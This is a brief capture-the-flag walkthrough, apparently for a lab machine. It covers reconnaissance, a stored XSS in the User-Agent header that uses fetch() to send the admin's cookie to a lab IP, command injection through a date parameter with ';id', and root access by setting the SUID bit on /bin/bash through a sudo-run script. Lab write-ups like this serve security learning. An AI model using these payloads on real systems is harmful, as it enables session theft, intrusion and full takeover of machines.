Started a nmap scan did  a 91 % scan box got restarted
```
22 OpenSSH 9.2p1 Debian
5000 Werkzeug 2.2.2 python 3.11.2
```

Starting a gobuster with `2-3.medium` 
```
/support  200 ok
/dashboard  500

```
Doing a nikto scan did not find anything

So there is a xss in the user agent using this payload and for the body of the message put `<>`
	`<img src=x onerror=fetch('http://10.10.14.47:8000/'+document.cookie);>`
and now we have the admin cookie using this cookie now we can access the dashboard we can see we can select the date we want to see a health report and there is a command injection in the date using this `;id` to do longer commands need to url encode and now we are the `dvir` user 
To get root make this script `initdb.sh`
```
echo "chmod u+s /bin/bash" > initdb.sh
chmod +x initdb.sh
sudo /usr/bin/syscheck
/bin/bash -p
``` 
and now we have root